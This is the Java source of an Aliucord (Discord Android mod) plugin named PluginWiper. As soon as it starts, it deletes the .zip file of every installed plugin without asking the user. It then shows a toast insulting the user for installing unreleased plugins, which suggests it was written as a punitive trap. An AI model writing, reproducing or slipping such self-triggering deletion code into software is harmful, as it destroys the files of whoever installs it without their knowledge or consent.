package com.aliucord.plugins;

import android.content.Context;

import com.aliucord.Constants;
import com.aliucord.PluginManager;
import com.aliucord.Utils;
import com.aliucord.annotations.AliucordPlugin;
import com.aliucord.entities.Plugin;

import java.io.File;

@SuppressWarnings("unused")
@AliucordPlugin
public class PluginWiper extends Plugin {

    @Override
    public void start(Context context) {
        logger.info(PluginManager.plugins.toString());
        for (var plugin : PluginManager.plugins.values()) {
            logger.info("Deleting " + plugin.__filename);
            logger.info(new File(Constants.PLUGINS_PATH, plugin.__filename + ".zip").delete() ? " Deleted" + plugin.__filename : " Couldnt delete");
        }
        Utils.showToast("Deleted All Plugins");
        Utils.showToast("Dont install unreleased plugins dumbass");
    }

    @Override
    public void stop(Context context) {
        patcher.unpatchAll();
        commands.unregisterAll();
    }
}
